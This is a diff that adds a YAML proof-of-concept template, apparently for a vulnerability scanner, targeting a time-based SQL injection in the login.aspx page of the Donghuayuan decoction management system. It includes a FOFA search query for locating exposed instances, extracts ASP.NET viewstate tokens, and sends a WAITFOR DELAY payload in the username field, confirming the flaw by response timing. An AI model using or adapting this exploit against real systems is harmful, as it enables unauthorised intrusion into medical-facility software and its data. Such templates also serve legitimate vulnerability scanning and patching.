@@ -1,0 +1,29 @@
+id: poc-yaml-donghuayuan-dms-login-aspx-sqli
+info:
+  name: 东华原煎药管理系统 login.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东华原煎药管理系统
+  fofa: app="北京东华原煎药管理系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /login.aspx
+  expression: status_code == 200 && contains(body,"北京东华原煎药管理系统")
+  output:
+  - regex_match(body,"id=\"__VIEWSTATE\" value=\"(?P<__VIEWSTATE>.*?)\"")
+  - regex_match(body,"id=\"__VIEWSTATEGENERATOR\" value=\"(?P<VIEWSTATEGENERATOR>.*?)\"")
+  - regex_match(body,"id=\"__EVENTVALIDATION\" value=\"(?P<__EVENTVALIDATION>.*?)\"")
+  - set_var("VIEWSTATE",urlencode(__VIEWSTATE))
+  - set_var("EVENTVALIDATION",urlencode(__EVENTVALIDATION))
+- method: POST
+  path: /login.aspx
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: __VIEWSTATE={{.VIEWSTATE}}&__VIEWSTATEGENERATOR={{.VIEWSTATEGENERATOR}}&__EVENTVALIDATION={{.EVENTVALIDATION}}&txtUserName=';WAITFOR+DELAY+'0:0:{{.t1}}'--&txtUserPwd=%27&btnLogin=%E7%99%BB%E5%BD%95
+  expression: status_code == 200 && contains(body,"不存在该用户工号") && duration > t1 &&
+    duration < t2
+transport: http
